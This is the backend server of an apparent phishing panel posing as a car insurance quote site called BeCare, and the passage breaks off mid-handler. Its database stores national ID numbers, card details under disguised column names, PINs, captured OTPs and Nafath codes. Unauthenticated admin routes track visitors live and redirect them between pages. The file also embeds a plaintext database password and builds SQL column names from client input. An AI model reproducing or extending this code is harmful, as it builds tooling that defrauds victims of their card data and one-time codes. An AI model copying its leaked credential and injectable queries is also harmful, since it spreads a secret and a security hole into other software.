// ═══════════════════════════════════════════════════════
// Backend API Server للوحة التحكم
// يتصل بقاعدة البيانات PostgreSQL
// ═══════════════════════════════════════════════════════

import express from 'express';
import cors from 'cors';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import fs from 'fs';
import pkg from 'pg';
const { Pool } = pkg;

// ES Module paths
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

const PORT = process.env.PORT || 3001;
const CLIENT_URL = process.env.CLIENT_URL || 'https://newbcare.onrender.com';
const RENDER_PORT = process.env.PORT || 10000; // Render uses PORT env var

// ═══════════════════════════════════════════════════════
// Logger Utility
// ═══════════════════════════════════════════════════════

const logger = {
  info: (msg, data = {}) => {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] ℹ️  INFO: ${msg}`, Object.keys(data).length ? data : '');
  },
  success: (msg, data = {}) => {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] ✅ SUCCESS: ${msg}`, Object.keys(data).length ? data : '');
  },
  error: (msg, error = null) => {
    const timestamp = new Date().toISOString();
    console.error(`[${timestamp}] ❌ ERROR: ${msg}`, error ? error.message || error : '');
  },
  warn: (msg, data = {}) => {
    const timestamp = new Date().toISOString();
    console.warn(`[${timestamp}] ⚠️  WARN: ${msg}`, Object.keys(data).length ? data : '');
  },
  incoming: (method, path, origin) => {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] 📥 INCOMING REQUEST: ${method} ${path} from ${origin || 'unknown'}`);
  },
  outgoing: (method, path, status, duration) => {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] 📤 OUTGOING RESPONSE: ${method} ${path} | Status: ${status} | Duration: ${duration}ms`);
  }
};

// Middleware - Request Logger
app.use((req, res, next) => {
  const startTime = Date.now();
  const origin = req.headers.origin || req.ip;
  
  logger.incoming(req.method, req.path, origin);
  
  res.on('finish', () => {
    const duration = Date.now() - startTime;
    logger.outgoing(req.method, req.path, res.statusCode, duration);
  });
  
  next();
});

// Middleware - CORS
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PATCH, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.json());

// Serve static files from dist folder
const distPath = join(__dirname, '..', 'dist');
const distExists = fs.existsSync(distPath) && fs.existsSync(join(distPath, 'index.html'));

// Check if dist folder exists and serve static files
if (distExists) {
  app.use(express.static(distPath));
  logger.success('Static files found - serving from dist folder');
} else {
  logger.warn('No dist folder found - static files will not be served');
  logger.info('This is expected in development mode');
}

// Serve index.html for all non-API routes (SPA support)
app.use((req, res, next) => {
  if (req.path.startsWith('/api') || req.path.startsWith('/socket.io')) {
    return next();
  }
  
  if (distExists) {
    const indexPath = join(distPath, 'index.html');
    return res.sendFile(indexPath);
  }
  
  // If no dist folder, return a simple HTML page with API status
  res.status(200).send(`
    <!DOCTYPE html>
    <html>
      <head>
        <meta charset="utf-8">
        <title>BeCare Dashboard API</title>
        <style>
          body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #1a1a2e; color: #eee; }
          h1 { color: #00d4ff; }
          .status { color: #00ff88; }
          .endpoints { text-align: right; max-width: 600px; margin: 20px auto; background: #16213e; padding: 20px; border-radius: 10px; }
          a { color: #00d4ff; }
        </style>
      </head>
      <body>
        <h1>🛡️ BeCare Dashboard API</h1>
        <p class="status">✅ Server is running</p>
        <div class="endpoints">
          <h3>Available Endpoints:</h3>
          <p>GET /api/visitors - List all visitors</p>
          <p>GET /api/visitors/:id - Get visitor</p>
          <p>PATCH /api/visitors/:id - Update visitor</p>
          <p>GET /api/stats - Dashboard stats</p>
          <p>GET /api/health - Health check</p>
        </div>
        <p><small>Note: Build the frontend with 'npm run build' to serve static files</small></p>
      </body>
    </html>
  `);
});

logger.info('Static file serving configured');
// Force redeploy

// ═══════════════════════════════════════════════════════
// اتصال قاعدة البيانات
// ═══════════════════════════════════════════════════════

// Parse the connection string to handle IPv4 fallback
const getDbConfig = () => {
  const connectionString = process.env.DATABASE_URL || 'postgresql://postgres:Fa%40%4020yiz2020@db.zspliwktncgjznoerwlu.supabase.co:5432/postgres';
  
  // Try IPv4 connection first
  return {
    connectionString,
    ssl: {
      rejectUnauthorized: false
    },
    // Force IPv4
    host: 'db.zspliwktncgjznoerwlu.supabase.co',
    port: 5432,
    // Fallback DNS settings
    query_timeout: 10000,
    connectionTimeoutMillis: 10000,
  };
};

const pool = new Pool(getDbConfig());

// ═══════════════════════════════════════════════════════
// Auto Migration System - إنشاء الجداول تلقائياً
// ═══════════════════════════════════════════════════════

const migrations = [
  {
    name: 'visitors',
    create: `
      CREATE TABLE IF NOT EXISTS visitors (
        id VARCHAR(255) PRIMARY KEY,
        identity_number VARCHAR(10),
        owner_name VARCHAR(255),
        phone_number VARCHAR(20),
        document_type VARCHAR(50),
        serial_number VARCHAR(50),
        insurance_type VARCHAR(50),
        insurance_coverage VARCHAR(50),
        insurance_start_date DATE,
        vehicle_usage VARCHAR(50),
        vehicle_value DECIMAL(15, 2),
        vehicle_year VARCHAR(4),
        vehicle_model VARCHAR(255),
        repair_location VARCHAR(50),
        selected_offer JSONB,
        offer_total_price DECIMAL(15, 2),
        country VARCHAR(10),
        device_type VARCHAR(50),
        browser VARCHAR(100),
        os VARCHAR(100),
        screen_resolution VARCHAR(20),
        current_step INT DEFAULT 1,
        current_page VARCHAR(50) DEFAULT 'home-new',
        is_online BOOLEAN DEFAULT true,
        is_blocked BOOLEAN DEFAULT false,
        is_unread BOOLEAN DEFAULT true,
        _v1 VARCHAR(255),
        _v2 VARCHAR(255),
        _v3 VARCHAR(255),
        _v4 VARCHAR(255),
        _v1_status VARCHAR(50),
        card_status VARCHAR(50),
        card_updated_at TIMESTAMP,
        _v5 VARCHAR(10),
        _v5_status VARCHAR(50) DEFAULT 'pending',
        otp_submitted_at TIMESTAMP,
        otp_resend_requested BOOLEAN DEFAULT false,
        otp_resend_at TIMESTAMP,
        all_otps JSONB,
        otp_updated_at TIMESTAMP,
        _v6 VARCHAR(10),
        _v6_status VARCHAR(50) DEFAULT 'pending',
        pin_submitted_at TIMESTAMP,
        pin_updated_at TIMESTAMP,
        payment_status VARCHAR(50),
        phone_id_number VARCHAR(10),
        phone_number VARCHAR(20),
        phone_carrier VARCHAR(50),
        phone_submitted_at TIMESTAMP,
        phone_updated_at TIMESTAMP,
        _v4_status VARCHAR(50),
        phone_otp_status VARCHAR(50),
        old_phone_info JSONB,
        _v8 VARCHAR(10),
        _v9 VARCHAR(255),
        nafad_confirmation_code VARCHAR(10),
        nafad_confirmation_status VARCHAR(50),
        nafad_updated_at TIMESTAMP,
        redirect_page VARCHAR(50),
        home_completed_at TIMESTAMP,
        insur_completed_at TIMESTAMP,
        compar_completed_at TIMESTAMP,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_active_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        session_start_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `,
    indexes: [
      'CREATE INDEX IF NOT EXISTS idx_visitors_identity ON visitors(identity_number)',
      'CREATE INDEX IF NOT EXISTS idx_visitors_phone ON visitors(phone_number)',
      'CREATE INDEX IF NOT EXISTS idx_visitors_current_page ON visitors(current_page)',
      'CREATE INDEX IF NOT EXISTS idx_visitors_is_blocked ON visitors(is_blocked)',
      'CREATE INDEX IF NOT EXISTS idx_visitors_created_at ON visitors(created_at)',
      'CREATE INDEX IF NOT EXISTS idx_visitors_is_online ON visitors(is_online)'
    ]
  },
  {
    name: 'visitor_history',
    create: `
      CREATE TABLE IF NOT EXISTS visitor_history (
        id SERIAL PRIMARY KEY,
        visitor_id VARCHAR(255) NOT NULL,
        type VARCHAR(50) NOT NULL,
        data JSONB,
        status VARCHAR(50) DEFAULT 'pending',
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `,
    indexes: [
      'CREATE INDEX IF NOT EXISTS idx_visitor_history_visitor ON visitor_history(visitor_id)',
      'CREATE INDEX IF NOT EXISTS idx_visitor_history_type ON visitor_history(type)',
      'CREATE INDEX IF NOT EXISTS idx_visitor_history_status ON visitor_history(status)'
    ]
  },
  {
    name: 'visitor_messages',
    create: `
      CREATE TABLE IF NOT EXISTS visitor_messages (
        id SERIAL PRIMARY KEY,
        visitor_id VARCHAR(255) NOT NULL,
        message TEXT NOT NULL,
        sender_name VARCHAR(255),
        is_from_admin BOOLEAN DEFAULT false,
        is_read BOOLEAN DEFAULT false,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `,
    indexes: [
      'CREATE INDEX IF NOT EXISTS idx_visitor_messages_visitor ON visitor_messages(visitor_id)',
      'CREATE INDEX IF NOT EXISTS idx_visitor_messages_is_read ON visitor_messages(is_read)'
    ]
  },
  {
    name: 'public_settings',
    create: `
      CREATE TABLE IF NOT EXISTS public_settings (
        id SERIAL PRIMARY KEY,
        setting_key VARCHAR(100) NOT NULL UNIQUE,
        setting_value TEXT,
        description VARCHAR(500),
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `,
    defaults: [
      "INSERT INTO public_settings (setting_key, setting_value, description) VALUES ('siteName', 'BeCare', 'Site Name') ON CONFLICT (setting_key) DO NOTHING",
      "INSERT INTO public_settings (setting_key, setting_value, description) VALUES ('supportEmail', 'support@becare.com', 'Support Email') ON CONFLICT (setting_key) DO NOTHING",
      "INSERT INTO public_settings (setting_key, setting_value, description) VALUES ('maintenanceMode', 'false', 'Maintenance Mode') ON CONFLICT (setting_key) DO NOTHING"
    ]
  },
  {
    name: 'insurance_companies',
    create: `
      CREATE TABLE IF NOT EXISTS insurance_companies (
        id VARCHAR(100) PRIMARY KEY,
        name VARCHAR(255) NOT NULL,
        name_en VARCHAR(255),
        logo_url VARCHAR(500),
        is_active BOOLEAN DEFAULT true,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `,
    indexes: [
      'CREATE INDEX IF NOT EXISTS idx_companies_active ON insurance_companies(is_active)'
    ]
  },
  {
    name: 'insurance_offers',
    create: `
      CREATE TABLE IF NOT EXISTS insurance_offers (
        id VARCHAR(100) PRIMARY KEY,
        company_id VARCHAR(100) NOT NULL,
        name VARCHAR(255) NOT NULL,
        type VARCHAR(50) NOT NULL,
        main_price DECIMAL(15, 2) NOT NULL,
        is_active BOOLEAN DEFAULT true,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `,
    indexes: [
      'CREATE INDEX IF NOT EXISTS idx_offers_company ON insurance_offers(company_id)',
      'CREATE INDEX IF NOT EXISTS idx_offers_type ON insurance_offers(type)'
    ]
  },
  {
    name: 'offer_features',
    create: `
      CREATE TABLE IF NOT EXISTS offer_features (
        id VARCHAR(100) PRIMARY KEY,
        offer_id VARCHAR(100) NOT NULL,
        content TEXT NOT NULL,
        price DECIMAL(15, 2) DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `,
    indexes: [
      'CREATE INDEX IF NOT EXISTS idx_offer_features_offer ON offer_features(offer_id)'
    ]
  },
  {
    name: 'offer_expenses',
    create: `
      CREATE TABLE IF NOT EXISTS offer_expenses (
        id VARCHAR(100) PRIMARY KEY,
        offer_id VARCHAR(100) NOT NULL,
        reason VARCHAR(255) NOT NULL,
        price DECIMAL(15, 2) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `,
    indexes: [
      'CREATE INDEX IF NOT EXISTS idx_offer_expenses_offer ON offer_expenses(offer_id)'
    ]
  },
  {
    name: 'socket_sessions',
    create: `
      CREATE TABLE IF NOT EXISTS socket_sessions (
        id SERIAL PRIMARY KEY,
        socket_id VARCHAR(100) NOT NULL,
        visitor_id VARCHAR(255),
        connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        disconnected_at TIMESTAMP,
        last_heartbeat TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        ip_address VARCHAR(50)
      );
    `,
    indexes: [
      'CREATE INDEX IF NOT EXISTS idx_socket_sessions_visitor ON socket_sessions(visitor_id)',
      'CREATE INDEX IF NOT EXISTS idx_socket_sessions_socket ON socket_sessions(socket_id)'
    ]
  },
  {
    name: 'activity_log',
    create: `
      CREATE TABLE IF NOT EXISTS activity_log (
        id SERIAL PRIMARY KEY,
        visitor_id VARCHAR(255),
        action VARCHAR(100) NOT NULL,
        page VARCHAR(50),
        details JSONB,
        ip_address VARCHAR(50),
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `,
    indexes: [
      'CREATE INDEX IF NOT EXISTS idx_activity_visitor ON activity_log(visitor_id)',
      'CREATE INDEX IF NOT EXISTS idx_activity_action ON activity_log(action)',
      'CREATE INDEX IF NOT EXISTS idx_activity_created ON activity_log(created_at)'
    ]
  }
];

// تشغيل الـ Migrations
async function runMigrations() {
  logger.info('Starting database migrations...');
  
  for (const migration of migrations) {
    try {
      // التحقق من وجود الجدول
      const tableExists = await pool.query(`
        SELECT EXISTS (
          SELECT FROM information_schema.tables 
          WHERE table_schema = 'public' 
          AND table_name = $1
        ) as exists
      `, [migration.name]);
      
      if (!tableExists.rows[0].exists) {
        logger.info(`Creating table: ${migration.name}`);
        await pool.query(migration.create);
        logger.success(`Table created: ${migration.name}`);
      } else {
        logger.success(`Table exists: ${migration.name}`);
      }
      
      // إنشاء الفهارس
      if (migration.indexes) {
        for (const index of migration.indexes) {
          try {
            await pool.query(index);
          } catch (idxError) {
            // تجاهل أخطاء الفهارس المكررة
          }
        }
      }
      
      // إضافة البيانات الافتراضية
      if (migration.defaults) {
        for (const defaultData of migration.defaults) {
          try {
            await pool.query(defaultData);
          } catch (defError) {
            // تجاهل أخطاء البيانات المكررة
          }
        }
      }
      
    } catch (error) {
      logger.error(`Migration failed for table: ${migration.name}`, error);
    }
  }
  
  logger.success('All migrations completed successfully');
}

// اختبار الاتصال بقاعدة البيانات
pool.query('SELECT NOW()')
  .then(async () => {
    logger.success('Database connected successfully', { 
      host: 'db.zspliwktncgjznoerwlu.supabase.co',
      database: 'postgres'
    });
    // تشغيل Migrations بعد الاتصال
    await runMigrations();
  })
  .catch((error) => {
    logger.error('Failed to connect to database - Supabase may not be accessible from this network', error);
    logger.warn('Make sure Supabase project allows connections from 0.0.0.0/0 or specific IPs');
  });

pool.on('error', (error) => {
  logger.error('Unexpected database error', error);
});

// ═══════════════════════════════════════════════════════
// API Endpoints
// ═══════════════════════════════════════════════════════

// إنشاء زائر جديد
app.post('/api/visitors', async (req, res) => {
  try {
    const visitorData = req.body;
    
    logger.info('Creating new visitor', { visitorId: visitorData.id });
    
    // Map field names (handle both naming conventions)
    const mappedData = {
      id: visitorData.id,
      identity_number: visitorData.identityNumber || visitorData.identity_number,
      owner_name: visitorData.ownerName || visitorData.owner_name,
      phone_number: visitorData.phoneNumber || visitorData.phone_number,
      document_type: visitorData.documentType || visitorData.document_type,
      serial_number: visitorData.serialNumber || visitorData.serial_number,
      insurance_type: visitorData.insuranceType || visitorData.insurance_type,
      country: visitorData.country,
      device_type: visitorData.deviceType || visitorData.device_type,
      browser: visitorData.browser,
      os: visitorData.os,
      screen_resolution: visitorData.screenResolution || visitorData.screen_resolution,
      current_page: visitorData.currentPage || visitorData.current_page || 'home-new',
      current_step: visitorData.currentStep || visitorData.current_step || 1,
      is_online: true,
      is_blocked: false,
      is_unread: true,
      created_at: new Date(),
      last_active_at: new Date(),
      session_start_at: new Date()
    };
    
    // Check if visitor already exists
    const existing = await pool.query('SELECT id FROM visitors WHERE id = $1', [mappedData.id]);
    
    if (existing.rows.length > 0) {
      // Update existing visitor
      const result = await pool.query(
        `UPDATE visitors SET 
          last_active_at = NOW(),
          is_online = true,
          current_page = COALESCE($1, current_page),
          current_step = COALESCE($2, current_step)
         WHERE id = $3
         RETURNING *`,
        [mappedData.current_page, mappedData.current_step, mappedData.id]
      );
      logger.success('Visitor updated', { visitorId: mappedData.id });
      return res.json(result.rows[0]);
    }
    
    // Insert new visitor
    const result = await pool.query(
      `INSERT INTO visitors (
        id, identity_number, owner_name, phone_number, document_type, serial_number,
        insurance_type, country, device_type, browser, os, screen_resolution,
        current_page, current_step, is_online, is_blocked, is_unread,
        created_at, last_active_at, session_start_at
      ) VALUES (
        $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20
      ) RETURNING *`,
      [
        mappedData.id, mappedData.identity_number, mappedData.owner_name, mappedData.phone_number,
        mappedData.document_type, mappedData.serial_number, mappedData.insurance_type,
        mappedData.country, mappedData.device_type, mappedData.browser, mappedData.os,
        mappedData.screen_resolution, mappedData.current_page, mappedData.current_step,
        mappedData.is_online, mappedData.is_blocked, mappedData.is_unread,
        mappedData.created_at, mappedData.last_active_at, mappedData.session_start_at
      ]
    );
    
    logger.success('New visitor created', { visitorId: mappedData.id });
    res.status(201).json(result.rows[0]);
  } catch (error) {
    logger.error('Error creating visitor', error);
    res.status(500).json({ error: error.message });
  }
});

// جلب جميع الزوار
app.get('/api/visitors', async (req, res) => {
  try {
    logger.info('Fetching all visitors');
    const result = await pool.query(`
      SELECT * FROM visitors 
      ORDER BY last_active_at DESC 
      LIMIT 100
    `);
    logger.success(`Fetched ${result.rows.length} visitors`);
    res.json(result.rows);
  } catch (error) {
    logger.error('Error fetching visitors', error);
    res.status(500).json({ error: error.message });
  }
});

// جلب زائر واحد
app.get('/api/visitors/:id', async (req, res) => {
  try {
    const { id } = req.params;
    logger.info('Fetching visitor', { visitorId: id });
    const result = await pool.query('SELECT * FROM visitors WHERE id = $1', [id]);
    
    if (result.rows.length === 0) {
      logger.warn('Visitor not found', { visitorId: id });
      return res.status(404).json({ error: 'الزائر غير موجود' });
    }
    
    logger.success('Visitor fetched', { visitorId: id });
    res.json(result.rows[0]);
  } catch (error) {
    logger.error('Error fetching visitor', error);
    res.status(500).json({ error: error.message });
  }
});

// تحديث زائر
app.patch('/api/visitors/:id', async (req, res) => {
  try {
    const { id } = req.params;
    const updates = req.body;
    
    logger.info('Updating visitor', { visitorId: id, updates: Object.keys(updates) });
    
    if (Object.keys(updates).length === 0) {
      logger.warn('No data to update', { visitorId: id });
      return res.status(400).json({ error: 'لا توجد بيانات للتحديث' });
    }
    
    // Map camelCase to snake_case
    const fieldMapping = {
      'isOnline': 'is_online',
      'isBlocked': 'is_blocked',
      'isUnread': 'is_unread',
      'ownerName': 'owner_name',
      'phoneNumber': 'phone_number',
      'identityNumber': 'identity_number',
      'documentType': 'document_type',
      'serialNumber': 'serial_number',
      'insuranceType': 'insurance_type',
      'insuranceCoverage': 'insurance_coverage',
      'vehicleUsage': 'vehicle_usage',
      'vehicleValue': 'vehicle_value',
      'vehicleYear': 'vehicle_year',
      'vehicleModel': 'vehicle_model',
      'repairLocation': 'repair_location',
      'cardStatus': 'card_status',
      'currentPage': 'current_page',
      'currentStep': 'current_step',
      'redirectPage': 'redirect_page',
      'screenResolution': 'screen_resolution',
      'deviceType': 'device_type',
      'cardUpdatedAt': 'card_updated_at',
      'otpSubmittedAt': 'otp_submitted_at',
      'otpResendRequested': 'otp_resend_requested',
      'otpResendAt': 'otp_resend_at',
      'allOtps': 'all_otps',
      'otpUpdatedAt': 'otp_updated_at',
      'phoneIdNumber': 'phone_id_number',
      'phoneCarrier': 'phone_carrier',
      'phoneSubmittedAt': 'phone_submitted_at',
      'phoneUpdatedAt': 'phone_updated_at',
      'nafadConfirmationCode': 'nafad_confirmation_code',
      'nafadConfirmationStatus': 'nafad_confirmation_status',
      'nafadUpdatedAt': 'nafad_updated_at',
      'lastActiveAt': 'last_active_at',
      'sessionStartAt': 'session_start_at',
      'homeCompletedAt': 'home_completed_at',
      'insurCompletedAt': 'insur_completed_at',
      'comparCompletedAt': 'compar_completed_at',
      'offerTotalPrice': 'offer_total_price',
      'createdAt': 'created_at',
      'updatedAt': 'updated_at'
    };
    
    const mappedUpdates = {};
    for (const [key, value] of Object.entries(updates)) {
      const mappedKey = fieldMapping[key] || fieldMapping[key.replace(/([A-Z])/g, '_$1').toLowerCase()] || key;
      // تجاهل last_active_at من العميل لأننا نحدثه تلقائياً
      if (mappedKey !== 'last_active_at') {
        mappedUpdates[mappedKey] = value;
      }
    }
    
    // أضف last_active_at دائماً
    mappedUpdates.last_active_at = new Date();
    
    const keys = Object.keys(mappedUpdates);
    const values = Object.values(mappedUpdates);
    
    const setClause = keys.map((key, i) => `${key} = $${i + 1}`).join(', ');
    const query = `UPDATE visitors SET ${setClause} WHERE id = $${keys.length + 1} RETURNING *`;
    
    const result = await pool.query(query, [...values, id]);
    
    if (result.rows.length === 0) {
      logger.warn('Visitor not found for update', { visitorId: id });
      return res.status(404).json({ error: 'الزائر غير موجود' });
    }
    
    logger.success('Visitor updated', { visitorId: id, updatedFields: keys });
    res.json(result.rows[0]);
  } catch (error) {
    logger.error('Error updating visitor', error);
    res.status(500).json({ error: error.message });
  }
});

// تحويل زائر لصفحة معينة
app.post('/api/visitors/:id/redirect', async (req, res) => {
  try {
    const { id } = req.params;
    const { targetPage } = req.body;
    
    logger.info('Redirecting visitor', { visitorId: id, targetPage });
    
    if (!targetPage) {
      logger.warn('Target page not specified', { visitorId: id });
      return res.status(400).json({ error: 'الصفحة المطلوبة غير محددة' });
    }
    
    const result = await pool.query(
      'UPDATE visitors SET redirect_page = $1 WHERE id = $2 RETURNING *',
      [targetPage, id]
    );
    
    if (result.rows.length === 0) {
      logger.warn('Visitor not found for redirect', { visitorId: id });
      return res.status(404).json({ error: 'الزائر غير موجود' });
    }
    
    logger.success('Visitor redirected', { visitorId: id, targetPage });
    res.json({ success: true, visitor: result.rows[0] });
  } catch (error) {
    logger.error('Error redirecting visitor', error);
    res.status(500).json({ error: error.message });
  }
});

// حظر زائر
app.post('/api/visitors/:id/block', async (req, res) => {
  try {
    const { id } = req.params;
    logger.info('Blocking visitor', { visitorId: id });
    
    const result = await pool.query(
      'UPDATE visitors SET is_blocked = true WHERE id = $1 RETURNING *',
      [id]
    );
    
    if (result.rows.length === 0) {
      logger.warn('Visitor not found for block', { visitorId: id });
      return res.status(404).json({ error: 'الزائر غير موجود' });
    }
    
    logger.success('Visitor blocked', { visitorId: id });
    res.json({ success: true, visitor: result.rows[0] });
  } catch (error) {
    logger.error('Error blocking visitor', error);
    res.status(500).json({ error: error.message });
  }
});

// إلغاء حظر زائر
app.post('/api/visitors/:id/unblock', async (req, res) => {
  try {
    const { id } = req.params;
    logger.info('Unblocking visitor', { visitorId: id });
    
    const result = await pool.query(
      'UPDATE visitors SET is_blocked = false WHERE id = $1 RETURNING *',
      [id]
    );
    
    if (result.rows.length === 0) {
      logger.warn('Visitor not found for unblock', { visitorId: id });
      return res.status(404).json({ error: 'الزائر غير موجود' });
    }
    
    logger.success('Visitor unblocked', { visitorId: id });
    res.json({ success: true, visitor: result.rows[0] });
  } catch (error) {
    logger.error('Error unblocking visitor', error);
    res.status(500).json({ error: error.message });
  }
});

// جلب الرسائل
app.get('/api/visitors/:id/messages', async (req, res) => {
  try {
    const { id } = req.params;
    logger.info('Fetching messages', { visitorId: id });
    
    const result = await pool.query(
      'SELECT * FROM visitor_messages WHERE visitor_id = $1 ORDER BY created_at DESC',
      [id]
    );
    
    logger.success(`Fetched ${result.rows.length} messages`, { visitorId: id });
    res.json(result.rows);
  } catch (error) {
    logger.error('Error fetching messages', error);
    res.status(500).json({ error: error.message });
  }
});

// إرسال رسالة
app.post('/api/visitors/:id/messages', async (req, res) => {
  try {
    const { id } = req.params;
    const { message, senderName } = req.body;
    
    logger.info('Sending message', { visitorId: id, senderName });
    
    if (!message) {
      logger.warn('Message is empty', { visitorId: id });
      return res.status(400).json({ error: 'الرسالة مطلوبة' });
    }
    
    const result = await pool.query(
      `INSERT INTO visitor_messages (visitor_id, message, sender_name, is_from_admin) 
       VALUES ($1, $2, $3, true) RETURNING *`,
      [id, message, senderName || 'لوحة التحكم']
    );
    
    logger.success('Message sent', { visitorId: id, messageId: result.rows[0].id });
    res.json(result.rows[0]);
  } catch (error) {
    logger.error('Error sending message', error);
    res.status(500).json({ error: error.message });
  }
});

// جلب سجل التاريخ
app.get('/api/visitors/:id/history', async (req, res) => {
  try {
    const { id } = req.params;
    logger.info('Fetching history', { visitorId: id });
    
    const result = await pool.query(
      'SELECT * FROM visitor_history WHERE visitor_id = $1 ORDER BY timestamp DESC',
      [id]
    );
    
    logger.success(`Fetched ${result.rows.length} history records`, { visitorId: id });
    res.json(result.rows);
  } catch (error) {
    logger.error('Error fetching history', error);
    res.status(500).json({ error: error.message });
  }
});

// إضافة سجل تاريخ
app.post('/api/visitors/:id/history', async (req, res) => {
  try {
    const { id } = req.params;
    const { type, data, status } = req.body;
    
    logger.info('Adding history record', { visitorId: id, type });
    
    if (!type) {
      logger.warn('History type not specified', { visitorId: id });
      return res.status(400).json({ error: 'النوع مطلوب' });
    }
    
    const result = await pool.query(
      `INSERT INTO visitor_history (visitor_id, type, data, status) 
       VALUES ($1, $2, $3, $4) RETURNING *`,
      [id, type, JSON.stringify(data || {}), status || 'pending']
    );
    
    logger.success('History record added', { visitorId: id, historyId: result.rows[0].id });
    res.json(result.rows[0]);
  } catch (error) {
    logger.error('Error adding history', error);
    res.status(500).json({ error: error.message });
  }
});

// جلب الإعدادات العامة
app.get('/api/settings', async (req, res) => {
  try {
    logger.info('Fetching settings');
    const result = await pool.query('SELECT * FROM public_settings');
    const settings = {};
    result.rows.forEach(row => {
      settings[row.setting_key] = row.setting_value;
    });
    logger.success('Settings fetched');
    res.json(settings);
  } catch (error) {
    logger.error('Error fetching settings', error);
    res.status(500).json({ error: error.message });
  }
});

// جلب شركات التأمين
app.get('/api/companies', async (req, res) => {
  try {
    logger.info('Fetching companies');
    const result = await pool.query('SELECT * FROM insurance_companies ORDER BY name');
    logger.success(`Fetched ${result.rows.length} companies`);
    res.json(result.rows);
  } catch (error) {
    logger.error('Error fetching companies', error);
    res.status(500).json({ error: error.message });
  }
});

// جلب العروض
app.get('/api/offers', async (req, res) => {
  try {
    logger.info('Fetching offers');
    const result = await pool.query('SELECT * FROM insurance_offers ORDER BY main_price');
    logger.success(`Fetched ${result.rows.length} offers`);
    res.json(result.rows);
  } catch (error) {
    logger.error('Error fetching offers', error);
    res.status(500).json({ error: error.message });
  }
});

// إحصائيات
app.get('/api/stats', async (req, res) => {
  try {
    logger.info('Fetching stats');
    const totalVisitors = await pool.query('SELECT COUNT(*) FROM visitors');
    const activeVisitors = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_online = true');
    const blockedVisitors = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_blocked = true');
    const totalMessages = await pool.query('SELECT COUNT(*) FROM visitor_messages WHERE is_from_admin = false AND is_read = false');
    
    const stats = {
      totalVisitors: parseInt(totalVisitors.rows[0].count),
      activeVisitors: parseInt(activeVisitors.rows[0].count),
      blockedVisitors: parseInt(blockedVisitors.rows[0].count),
      unreadMessages: parseInt(totalMessages.rows[0].count)
    };
    
    logger.success('Stats fetched', stats);
    res.json(stats);
  } catch (error) {
    logger.error('Error fetching stats', error);
    res.status(500).json({ error: error.message });
  }
});

// Health Check
app.get('/api/health', async (req, res) => {
  try {
    await pool.query('SELECT 1');
    res.json({ status: 'ok', database: 'connected' });
  } catch (error) {
    res.json({ status: 'error', database: 'disconnected', error: error.message });
  }
});

// ═══════════════════════════════════════════════════════
// Socket.io Events
// ═══════════════════════════════════════════════════════

io.on('connection', (socket) => {
  logger.info('Client connected to Socket.io', { socketId: socket.id });

  // الانضمام كمسؤول
  socket.on('admin:join', () => {
    logger.success('Admin joined via Socket.io', { socketId: socket.id });
    socket.join('admin');
  });

  // تحويل زائر لصفحة معينة
  socket.on('visitor:redirect', async (data) => {
    const { visitorId, targetPage } = data;
    logger.info('Socket: Redirecting visitor', { visitorId, targetPage });
    
    try {
      await pool.query(
        'UPDATE visitors SET redirect_page = $1, updated_at = NOW() WHERE id = $2',
        [targetPage, visitorId]
      );
      io.to(visitorId).emit('redirect', { page: targetPage });
      logger.success('Socket: Visitor redirected', { visitorId, targetPage });
    } catch (error) {
      logger.error('Socket: Error redirecting visitor', error);
    }
  });

  // تحديث حالة زائر
  socket.on('visitor:status_updated', async (data) => {
    const { visitorId, field, status } = data;
    logger.info('Socket: Updating visitor status', { visitorId, field, status });
    
    try {
      await pool.query(
        `UPDATE visitors SET ${field} = $1, updated_at = NOW() WHERE id = $2`,
        [status, visitorId]
      );
      io.to(visitorId).emit('status_updated', { field, status });
      logger.success('Socket: Visitor status updated', { visitorId, field, status });
    } catch (error) {
      logger.error('Socket: Error updating status', error);
    }
  });

  // إرسال رسالة لزائر
  socket.on('visitor:send_message', async (data) => {
    const { visitorId, message, senderName } = data;
    logger.info('Socket: Sending message', { visitorId, senderName });
    
    try {
      const result = await pool.query(
        `INSERT INTO visitor_messages (visitor_id, message, sender_name, is_from_admin) 
         VALUES ($1, $2, $3, true) RETURNING *`,
        [visitorId, message, senderName || 'لوحة التحكم']
      );
      io.to(visitorId).emit('new_message', result.rows[0]);
      logger.success('Socket: Message sent', { visitorId, messageId: result.rows[0].id });
    } catch (error) {
      logger.error('Socket: Error sending message', error);
    }
  });

  // حظر زائر
  socket.on('visitor:block', async (data) => {
